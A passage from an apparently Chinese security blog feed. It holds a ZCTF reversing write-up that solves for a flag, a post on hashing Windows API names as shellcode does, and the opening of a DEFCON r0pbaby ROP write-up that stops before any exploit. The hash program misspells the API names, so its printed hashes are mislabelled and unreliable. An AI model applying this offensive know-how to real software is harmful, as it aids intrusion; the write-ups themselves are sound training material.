<ol>
<li>小于36字符</li>
<li>格式为ZCTF{}</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="number">__u</span>sercall start@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;esi&gt;, <span class="number">_B</span>YTE *a2@&lt;ebx&gt;)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+1h] [bp-29h]@4</span></div><div class="line">  <span class="keyword">char</span> Str; <span class="comment">// [sp+2h] [bp-28h]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+3h] [bp-27h]@1</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+7h] [bp-23h]@1</span></div><div class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+Bh] [bp-1Fh]@1</span></div><div class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+Fh] [bp-1Bh]@1</span></div><div class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+13h] [bp-17h]@1</span></div><div class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+17h] [bp-13h]@1</span></div><div class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+1Bh] [bp-Fh]@1</span></div><div class="line">  <span class="keyword">char</span> v12; <span class="comment">// [sp+1Fh] [bp-Bh]@1</span></div><div class="line">  <span class="keyword">char</span> *v13; <span class="comment">// [sp+26h] [bp-4h]@8</span></div><div class="line"></div><div class="line">  Str = <span class="number">0</span>;</div><div class="line">  v5 = <span class="number">0</span>;</div><div class="line">  v6 = <span class="number">0</span>;</div><div class="line">  v7 = <span class="number">0</span>;</div><div class="line">  v8 = <span class="number">0</span>;</div><div class="line">  v9 = <span class="number">0</span>;</div><div class="line">  v10 = <span class="number">0</span>;</div><div class="line">  v11 = <span class="number">0</span>;</div><div class="line">  v12 = <span class="number">0</span>;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Please input the flag : "</span>);</div><div class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;Str);</div><div class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;Str) &lt; <span class="number">0x1E</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( SBYTE3(v5) == <span class="string">'&#123;'</span> &amp;&amp; *(&amp;v3 + <span class="built_in">strlen</span>(&amp;Str)) == <span class="string">'&#125;'</span> )</div><div class="line">    &#123;</div><div class="line">      *(&amp;v3 + <span class="built_in">strlen</span>(&amp;Str)) = <span class="number">0</span>;</div><div class="line">      BYTE3(v5) = <span class="number">0</span>;</div><div class="line">      <span class="keyword">if</span> ( !stricmp(&amp;Str, <span class="string">"ZCTF"</span>) )</div><div class="line">      &#123;</div><div class="line">        v13 = &amp;v6;</div><div class="line">        <span class="keyword">if</span> ( sub_E912E0(a1, a2, &amp;v6) )</div><div class="line">          <span class="built_in">printf</span>(<span class="string">"Congratulations!\n"</span>);</div><div class="line">        <span class="keyword">else</span></div><div class="line">          <span class="built_in">printf</span>(<span class="string">"Sorry! Flag error!\n"</span>);</div><div class="line">        result = <span class="number">0</span>;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Sorry! Flag error!\n"</span>);</div><div class="line">        result = <span class="number">1</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"Sorry! Flag error!\n"</span>);</div><div class="line">      result = <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Sorry! Flag error!\n"</span>);</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>用OD进行动态调试，关键位置下好断点，来到如下位置<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-1.png" alt=""><br>跟到上面的位置，发现大括号里面长度为17，然后取每一字符减去0x30再查询一个偏移表，然后通过跳转表跳转到指定位置初始化一个全局变量。<br>跳转表如下：<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-2.png" alt=""><br>偏移表如下:<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-3.png" alt=""></p>
<p>其中偏移表中填充了大量0x0B，查询到这个偏移后通过跳转表会直接跳转到函数结束的位置。这里要注意这两个表的跳转关系，输入的字符每一个减去0x30后，先和0x3F比较（偏移表的长度为0x3F,不能跑到这个表外面去），然后再加偏移表的首地址得到一个地址，里面的值就是偏移量，如果值是0，就对应分支表的第一个跳转，如果值是1就对应分支表的第二个跳转，依次类推。跳转到相对应的位置进行替换。<br>通过偏移表中对应的值的地址-偏移表起始地址+0x30反推输入与全局变量的关系如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0 .</div><div class="line">o 0</div><div class="line">e 1</div><div class="line">T 2</div><div class="line">H 3</div><div class="line">U 4</div><div class="line">_ 5</div><div class="line">S 6</div><div class="line">8 7</div><div class="line">W 8</div><div class="line">R 9</div></pre></td></tr></table></figure></p>
<p>当然这种对应关系看IDA会更加清楚一点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *<span class="number">__u</span>sercall sub_E91000@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax@1</span></div><div class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@2</span></div><div class="line"></div><div class="line">  v1 = <span class="built_in">strlen</span>(*(a1 + <span class="number">8</span>));</div><div class="line">  <span class="keyword">if</span> ( v1 == <span class="number">17</span> )</div><div class="line">  &#123;</div><div class="line">    *(a1 - <span class="number">4</span>) = <span class="number">0</span>;</div><div class="line">    *(a1 - <span class="number">5</span>) = *(*(a1 - <span class="number">4</span>) + *(a1 + <span class="number">8</span>));</div><div class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      *(a1 - <span class="number">12</span>) = *(a1 - <span class="number">5</span>);</div><div class="line">      *(a1 - <span class="number">12</span>) -= <span class="number">0x30</span>;</div><div class="line">      <span class="keyword">switch</span> ( *(a1 - <span class="number">12</span>) )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x2E</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x3F</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x30</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x35</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x31</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x24</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x32</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x18</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x33</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x25</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x34</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x2F</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x35</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x23</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x36</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">0x37</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x27</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">56</span>;</div><div class="line">          <span class="keyword">goto</span> LABEL_19;</div><div class="line">        <span class="keyword">case</span> <span class="number">0x22</span>:</div><div class="line">          *(&amp;Str + *(a1 - <span class="number">4</span>)) = <span class="number">57</span>;</div><div class="line">LABEL_19:</div><div class="line">          *(a1 - <span class="number">5</span>) = *(++*(a1 - <span class="number">4</span>) + *(a1 + <span class="number">8</span>));</div><div class="line">          <span class="keyword">if</span> ( *(a1 - <span class="number">5</span>) )</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">          result = &amp;Str;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          result = <span class="number">0</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后将这个数值在00c61323这个函数里做浮点运算<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-4.png" alt=""></p>
<p>运算后的结果和0x19异或后和字符串. 7 , ) <em> ! . ( , , ) . , ,</em> / <em> </em>  进行比较,当然我们用0x19和字符串. 7 , ) <em> ! . ( , , ) . , , </em> / <em> </em> 异或后会得到正确的flag的浮点运算结果，然后逆推。<br>对应关系如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.7,)*!.(,,).,,*/**</div><div class="line">7.5038715507553633</div></pre></td></tr></table></figure></p>
<p>所以重点在浮点运算，我们看一下浮点运算函数的汇编代码</p>
<p>F7跟入函数<br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-8.png" alt=""><br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-5.png" alt=""><br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-6.png" alt=""><br><img src="http://oj3cgkt4g.bkt.clouddn.com/2017330-7.png" alt=""></p>
<p>根据0xF13348处的浮点数一共算出四个结果，分析过程如上图。得到一元二次方程,我们解这个方程得到浮点运算前的数值，也就是刚开始时替换后的数值：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!usr/bin/env python</span></div><div class="line"><span class="comment"># _*_ coding: utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">res1 = (Str - 1.864832709999999) * (6.51951822361*Str)</div><div class="line">res2 = (Str - 5.778432978588) * (Str + 3.1415926) * 7.861418532</div><div class="line">res3 = (Str*Str - 0.8521405969999999) * (8.7356198421365 - 2.0000)</div><div class="line">res4 = (Str*Str * 4.93287651872 - Str * 9.542697368122542) * 2.681794561929999</div><div class="line">result = res1 + res2 - res3 + res4 + 60.0000</div><div class="line">"""</div><div class="line"></div><div class="line">Str = symbols(<span class="string">'Str'</span>)</div><div class="line">jie = solve([<span class="number">-7.5038715507553633</span> +(Str - <span class="number">1.864832709999999</span>) * (<span class="number">6.51951822361</span>*Str)</div><div class="line">              +(Str - <span class="number">5.778432978588</span>) * (Str + <span class="number">3.1415926</span>) * <span class="number">7.861418532</span></div><div class="line">              -(Str*Str - <span class="number">0.8521405969999999</span>) * (<span class="number">8.7356198421365</span> - <span class="number">2.0000</span>)</div><div class="line">              + (Str*Str * <span class="number">4.93287651872</span> - Str * <span class="number">9.542697368122542</span>) * <span class="number">2.681794561929999</span></div><div class="line">              + <span class="number">60.0000</span>],[Str])</div><div class="line"><span class="keyword">print</span> jie</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">D:\Python27\python.exe C:/Users/Desktop/Math.py</div><div class="line">[(-1.05058442661615,), (3.85205471562591,)]</div><div class="line"></div><div class="line">Process finished with exit code 0</div></pre></td></tr></table></figure></p>
<p>有两个解，[(-1.05058442661615,), (3.85205471562591,)]<br>上面的result，也就是7.5038715507553633是根据判断处的数据和0x19异或得到的。<br>解出来以后通过查上面的对应关系能得到FLAG。负解舍弃，保留正解3.85205471562591，但由于精度不够，最后一位字符没有对照，但完全可以猜出来，就是那17个字符8  ， H   ， R   ， S  ，  T  ，  U  ，  W  ，  _  ， e ，  o ，  0 中的一个。最后flag为ZCTF{H0W_To_U8e_ST_Re8}</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;这个题就是把输入的字符串先去掉ZCTF{}后，把括号里的字符串替换，然后进行了浮点运算，运算后的结果和0x19异或，得到的数值就是 . 7 , ) &lt;em&gt; ! . ( , , ) . , , &lt;/em&gt; / &lt;em&gt; &lt;/em&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向破解" scheme="http://spd.dropsec.xyz/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="CTF" scheme="http://spd.dropsec.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>函数名称的hash值计算方法以及其代码实现</title>
    <link href="http://spd.dropsec.xyz/2017/03/19/%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0%E7%9A%84hash%E5%80%BC%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%85%B6%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
    <id>http://spd.dropsec.xyz/2017/03/19/函数名称的hash值计算方法以及其代码实现/</id>
    <published>2017-03-19T03:27:14.000Z</published>
    <updated>2017-04-07T09:22:55.919Z</updated>
    
    <content type="html"><![CDATA[<p>通过hash算法，我们能够将任意长度的函数名称变成四个字节（DWORD）的长度。这里简单分析一下上述hash值的计算方法。假设现在有一个函数，名为“AB”，然后调用GetHash函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hash = GetHash(&quot;AB&quot;);</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>进入GetHash函数，它会将函数名称中的字符一个一个地分别取出进行计算，有几个字符就循环计算几次。首先是第一次循环，取出字符“A”，然后有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">digest = ((digest &lt;&lt; 25) | (digest &gt;&gt; 7 ));</div></pre></td></tr></table></figure></p>
<p>这里由于digest在上面被赋值为0，且为DWORD类型，因此这里不管怎么计算，它的值都是0。然后计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">digest += *fun_name;</div></pre></td></tr></table></figure></p>
<p>此时的digest是0，*fun_name保存的是第一个字符“A”，它们相加也就是ASCII码值的相加，结果就是digest的值为“00000000 00000000 00000000 01000001”。然后执行语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fun_name++;</div></pre></td></tr></table></figure></p>
<p>令指针指向第二个字符“B”，从而进入第二次循环。首先计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">digest = ((digest &lt;&lt; 25) | (digest &gt;&gt; 7 ));</div></pre></td></tr></table></figure></p>
<p>首先将digest左移25位，即“10000010 00000000 00000000 00000000”，然后将其右移7位，即“10000010 00000000 00000000 00000000”，然后江这两个值做“或”运算，则digest的值为“10000010 00000000 00000000 00000000”。事实上，上述语句的目的是实现digest的循环右移7位（或循环左移25位），由于C语言没有直接实现循环移位的运算符号，因此只能通过这种方式运算。然后计算：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">digest += *fun_name;</div></pre></td></tr></table></figure>
<p>也就是将digest的值加上“B”的ASCII码值，结果为“10000010 00000000 00000000 01000010”，这也就是最终的运算结果，以十六进制显示就是0x82000042。</p>
<p>接下来我们获取“MessageBox”、“ExitProcess”、“LoadlibraryA”的hash值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function">DWORD <span class="title">GetHash</span><span class="params">(<span class="keyword">char</span> *fun_name)</span></span></div><div class="line">&#123;</div><div class="line">	DWORD digest = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(*fun_name)</div><div class="line">	&#123;</div><div class="line">		digest = (( digest&lt;&lt;<span class="number">25</span> ) | (digest&gt;&gt;<span class="number">7</span> ));</div><div class="line">		digest +=*fun_name;</div><div class="line">		fun_name++;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> digest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	DWORD hash;</div><div class="line">	hash = GetHash(<span class="string">"MassageBOXA"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The hash of MessageBox is 0x%.8x\n"</span>, hash);</div><div class="line">	hash = GetHash(<span class="string">"EXitProcess"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The hash of ExitProcess is 0x%.8x\n"</span>, hash);</div><div class="line">	hash = GetHash(<span class="string">"LoadLibaryA"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"The hash of LoadlibraryA is 0x%.8x"</span>, hash);</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">The hash of MessageBox is 0xddb80a61</div><div class="line">The hash of ExitProcess is 0x4fd18923</div><div class="line">The hash of LoadlibraryA is 0x56fd704e</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过hash算法，我们能够将任意长度的函数名称变成四个字节（DWORD）的长度。这里简单分析一下上述hash值的计算方法。假设现在有一个函数，名为“AB”，然后调用GetHash函数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;hash = GetHash(&amp;quot;AB&amp;quot;);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="编程技术" scheme="http://spd.dropsec.xyz/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Windows" scheme="http://spd.dropsec.xyz/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON-CTF-Quals-2015:r0pbaby</title>
    <link href="http://spd.dropsec.xyz/2017/03/17/DEFCON-CTF-Quals-2015-r0pbaby/"/>
    <id>http://spd.dropsec.xyz/2017/03/17/DEFCON-CTF-Quals-2015-r0pbaby/</id>
    <published>2017-03-17T12:27:55.000Z</published>
    <updated>2017-04-07T08:58:34.320Z</updated>
    
    <content type="html"><![CDATA[<p>这是DEFCON CTF 2015中的一道题，经典的ROP利用。首先我们看一下这个bin文件的一些信息,它是一个64位的ELF文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file r0pbaby_542ee6516410709a1421141501f03760 </div><div class="line">r0pbaby_542ee6516410709a1421141501f03760: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped</div></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>我们用查看它都开了什么保护，结果发现开了数据执行保护和地址空间布局随机化保护。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ checksec </div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : ENABLED</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : ENABLED</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure></p>
<p>我们现在来还原实验环境，首先使用socat将它绑定在本地的1234端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ socat TCP-LISTEN:1234,reuseaddr,fork EXEC:&quot;./r0pbaby_542ee6516410709a1421141501f03760&quot;</div></pre></td></tr></table></figure></p>
<p>我们用nc链接，看一下它的执行流程。这个程序有四个选项，选项1是获得libc address;选项2是获得function函数在程序的真实地址；选项3是一个buffer,允许最多写入1024个字节；选项4是退出程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ nc localhost 1234</div><div class="line"></div><div class="line">Welcome to an easy Return Oriented Programming challenge...</div><div class="line">Menu:</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc function</div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 1</div><div class="line">libc.so.6: 0x00007FF8A8D009B0</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc function</div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 2</div><div class="line">Enter symbol: sytem</div><div class="line">Symbol sytem: 0x0000000000000000</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc function</div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 4</div><div class="line">Exiting.</div></pre></td></tr></table></figure></p>
<p>接下来我们用IDA分析一下这个伪代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</div><div class="line">&#123;</div><div class="line">  signed int v3; // eax@4</div><div class="line">  unsigned __int64 v4; // r14@15</div><div class="line">  int v5; // er13@17</div><div class="line">  size_t v6; // r12@17</div><div class="line">  int v7; // eax@18</div><div class="line">  void *handle; // [sp+8h] [bp-448h]@1</div><div class="line">  char nptr[1088]; // [sp+10h] [bp-440h]@2</div><div class="line">  __int64 savedregs; // [sp+450h] [bp+0h]@22</div><div class="line"></div><div class="line">  setvbuf(stdout, 0LL, 2, 0LL);</div><div class="line">  signal(14, handler);</div><div class="line">  alarm(0x3Cu);</div><div class="line">  puts(&quot;\nWelcome to an easy Return Oriented Programming challenge...&quot;);</div><div class="line">  